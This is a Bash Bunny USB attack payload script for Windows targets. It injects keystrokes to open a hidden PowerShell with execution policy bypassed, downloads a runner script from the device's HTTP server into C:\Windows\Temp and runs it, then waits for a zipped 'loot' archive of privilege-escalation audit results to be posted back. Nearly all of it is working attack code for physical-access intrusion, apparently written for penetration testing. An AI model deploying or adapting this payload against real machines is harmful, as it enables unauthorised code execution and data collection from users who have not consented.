#!/bin/bash
# ================================================================
#  Bash Bunny — privesc-windows-audit
#  Description : Downloads and executes PrivescAudit-Windows.ps1
#                from the Bunny's HTTP server, zips results, and
#                POSTs the archive back to receive.py on the Bunny.
#                LED stages: SETUP → ATTACK (inject) → CYAN (wait
#                for loot) → FINISH (loot received) / FAIL (timeout)
#  Target OS   : Windows (PS 3.0+)
#  Author      : <operator>
#  Switch      : Position 1 or 2
#  Files       : payload.txt, runner.ps1, receive.py,
#                PrivescAudit-Windows.ps1
# ================================================================

LED SETUP
ATTACKMODE HID RNDIS_ETHERNET

# Allow Windows time to enumerate USB devices and assign IP
sleep 5
LED ATTACK

# Inject single-quoted command to avoid shell variable expansion of $
Q GUI r
Q DELAY 800
Q STRING 'powershell -W Hidden -NoP -Exec Bypass -C "Set-ExecutionPolicy Bypass -Scope Process -Force; (New-Object Net.WebClient).DownloadFile('"'"'http://172.16.64.1/runner.ps1'"'"','"'"'C:\Windows\Temp\pea_runner.ps1'"'"'); & C:\Windows\Temp\pea_runner.ps1"'
Q ENTER

LED CYAN

# Poll for loot file (receive.py saves to $LOOT_DIR/privesc_audit.zip)
LOOT_DIR="/loot/privesc-windows-audit"
mkdir -p "$LOOT_DIR"

TIMEOUT=300
ELAPSED=0
while [ "$ELAPSED" -lt "$TIMEOUT" ]; do
    if [ -f "${LOOT_DIR}/privesc_audit.zip" ]; then
        LED FINISH
        break
    fi
    sleep 10
    ELAPSED=$((ELAPSED + 10))
done

if [ "$ELAPSED" -ge "$TIMEOUT" ]; then
    LED FAIL
fi
